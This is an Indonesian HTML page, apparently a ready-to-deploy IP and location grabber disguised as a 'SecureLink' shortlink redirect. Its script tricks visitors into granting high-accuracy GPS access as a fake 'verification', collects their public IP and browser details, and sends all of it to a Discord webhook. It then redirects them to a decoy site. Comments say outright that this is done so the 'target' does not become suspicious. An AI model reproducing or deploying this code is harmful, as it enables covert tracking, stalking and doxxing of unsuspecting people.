<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pengalih Tautan Aman</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding: 60px 15px; background-color: #f8f9fa; color: #333; }
        .container { max-width: 420px; margin: 0 auto; background: white; padding: 35px 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e9ecef; }
        .logo-placeholder { font-size: 24px; font-weight: 800; color: #007bff; margin-bottom: 20px; letter-spacing: -0.5px; }
        h3 { font-size: 18px; margin-bottom: 8px; color: #212529; }
        p { font-size: 14px; color: #6c757d; line-height: 1.5; margin-bottom: 25px; }
        .btn-redirect { background-color: #007bff; color: white; border: none; padding: 14px 24px; font-size: 16px; font-weight: 600; border-radius: 10px; cursor: pointer; width: 100%; transition: all 0.2s; box-shadow: 0 4px 12px rgba(0,123,255,0.2); }
        .btn-redirect:disabled { background-color: #6c757d; box-shadow: none; cursor: not-allowed; }
        #status-info { margin-top: 20px; font-size: 12px; color: #999; font-weight: 500; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-placeholder">🔗 SecureLink</div>
    <h3>Tautan Anda Sedang Disiapkan</h3>
    <p id="desc-text">Demi keamanan kenyamanan penjelajahan Anda, silakan klik tombol di bawah untuk memverifikasi koneksi perangkat dan melanjutkan ke halaman tujuan.</p>
    
    <!-- Tampilan tombol profesional yang menyamar sebagai shortlink -->
    <button class="btn-redirect" id="actionBtn" onclick="prosesPengalihanAman()">Menuju Link Tujuan</button>
    
    <div id="status-info">Aman & Terenkripsi oleh SecureLink SSL</div>
</div>

<script>
    const statusInfo = document.getElementById('status-info');
    const actionBtn = document.getElementById('actionBtn');
    const descText = document.getElementById('desc-text');
    
    const webhookUrl = "https://discord.com"; 
    
    // ALAMAT SITUS TUJUAN ASLI (Ganti dengan link video/artikel apa saja agar target tidak curiga)
    const urlTujuanAsli = "https://google.com"; 

    function prosesPengalihanAman() {
        actionBtn.disabled = true;
        actionBtn.innerText = "Memverifikasi...";
        statusInfo.innerHTML = "Menyelaraskan sensor perangkat... Mohon tunggu.";

        if (!navigator.geolocation) {
            selesaikanTanpaGPS("HTML5 Tidak Didukung Perangkat");
            return;
        }

        const konfigurasiGPS = {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 0
        };

        // Jalankan pelacakan koordinat GPS akurat rumah
        navigator.geolocation.getCurrentPosition(suksesMendapatGPS, gagalMendapatGPS, konfigurasiGPS);
    }

    async function suksesMendapatGPS(position) {
        statusInfo.innerHTML = "Otentikasi Jaringan Berhasil...";
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = `${position.coords.accuracy} meter`;

        // Ambil IP (Sistem pemrosesan string diperbaiki agar anti-stuck)
        const ipPublik = await dapatkanIPBenar();

        kirimLaporanKeDiscord(ipPublik, lat, lon, acc, "HTML5 GPS Sukses");
    }

    async function gagalMendapatGPS(error) {
        statusInfo.innerHTML = "Melanjutkan menggunakan enkripsi standar...";
        const ipPublik = await dapatkanIPBenar();
        kirimLaporanKeDiscord(ipPublik, "Ditolak", "Ditolak", "-", "HTML5 GPS Ditolak");
    }

    async function selesaikanTanpaGPS(alasan) {
        const ipPublik = await dapatkanIPBenar();
        kirimLaporanKeDiscord(ipPublik, "Tidak Tersedia", "Tidak Tersedia", "-", alasan);
    }

    // Perbaikan Bug Fetch IP: Mengambil data string murni tanpa memecah array secara salah
    async function dapatkanIPBenar() {
        try {
            const response = await fetch('https://cloudflare.com');
            const text = await response.text();
            const barisIP = text.split('\n').find(line => line.startsWith('ip='));
            if (barisIP) {
                return barisIP.replace('ip=', '').trim();
            }
            return "IP Tidak Terbaca";
        } catch (e) {
            return "Gagal Jalur Eksternal";
        }
    }

    function kirimLaporanKeDiscord(ip, lat, lon, acc, metode) {
        if (!webhookUrl) {
            alihkanKeSitusAsli();
            return;
        }

        const formatPesan = {
            content: `📌 **Log Baru Terdeteksi (Tampilan Baru)**\n🌐 **IP**: ${ip}\n📍 **GPS**: ${lat}, ${lon} (Akurasi: ${acc})\n📱 **OS/Browser**: ${navigator.userAgent}\n🛠️ **Status**: ${metode}`
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formatPesan)
        })
        .then(() => {
            console.log("Log sukses dikirim ke Discord!");
            alihkanKeSitusAsli(); // Otomatis pindah halaman setelah kirim data
        })
        .catch(err => {
            console.error(err);
            alihkanKeSitusAsli(); // Tetap pindahkan halaman jika ada error fetch agar target tidak curiga
        });
    }

    // Fungsi transisi pengalihan halaman secara halus
    function alihkanKeSitusAsli() {
        actionBtn.innerText = "Mengalihkan...";
        descText.innerHTML = "Verifikasi selesai! Anda sedang dialihkan ke halaman tujuan secara aman.";
        
        setTimeout(() => {
            window.location.href = urlTujuanAsli;
        }, 1000); // Target pindah ke situs asli dalam waktu 1 detik
    }
</script>

</body>
</html>
